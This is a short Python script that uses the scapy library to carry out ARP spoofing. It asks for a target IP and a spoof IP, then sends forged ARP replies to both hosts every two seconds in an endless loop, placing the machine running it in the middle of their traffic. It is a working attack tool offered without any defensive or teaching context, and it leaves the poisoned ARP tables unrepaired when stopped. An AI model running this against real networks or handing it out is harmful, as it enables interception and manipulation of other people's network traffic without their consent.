#!usr/bin/evo python

import scapy.all as scapy
import time
import sys 

def get_MAC(ip):
    
    arp_packets = scapy.ARP(pdst=ip)
    broadcast  = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    arp_broadcast_packets = broadcast/arp_packets

    answered_list = scapy.srp(arp_broadcast_packets, timeout=1,verbose =False)[0]
    return answered_list[0][1].hwsrc
    
    
    


def spoof(target_ip,spoof_ip):
    target_MAC = get_MAC(target_ip)
    packet = scapy.ARP(op=2 ,pdst= target_ip , hwdst= target_MAC , psrc= spoof_ip) 

#print(packet.show())
#print(packet.summary())

    scapy.send(packet,verbose=False)

send_packets_count = 0

target_ip = input("enter target ip > ")
spoof_ip = input("enter spoof ip > ")

try:
    while True:
         spoof(target_ip,spoof_ip)
         spoof(spoof_ip,target_ip)
         send_packets_count = send_packets_count + 2
         print("\r[+] send packets " + str(send_packets_count),end=''),
         sys.stdout.flush()
         time.sleep(2)
except:
      print("[+] Detecting control + C or Z  .... process is now being stopped")

